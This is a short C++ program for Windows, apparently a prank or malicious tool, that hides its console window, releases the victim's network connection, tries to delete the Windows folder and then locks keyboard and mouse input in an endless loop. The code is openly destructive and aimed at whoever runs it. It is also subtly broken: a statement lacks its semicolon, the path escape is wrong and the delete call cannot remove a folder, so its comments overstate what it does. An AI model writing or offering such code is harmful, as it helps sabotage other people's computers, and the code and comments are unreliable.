#include <iostream>
#include <Windows.h>
#include <cstdlib>

using namespace std;

int main(){
    FreeConsole(); //Hides Console

    system("ipconfig /release") //Just stops their internet!
    
    const int result = remove("C:\Windows"); //Delets The C:\ Folder!
    while(1){
        BlockInput(true);
    }
    return 0;
}
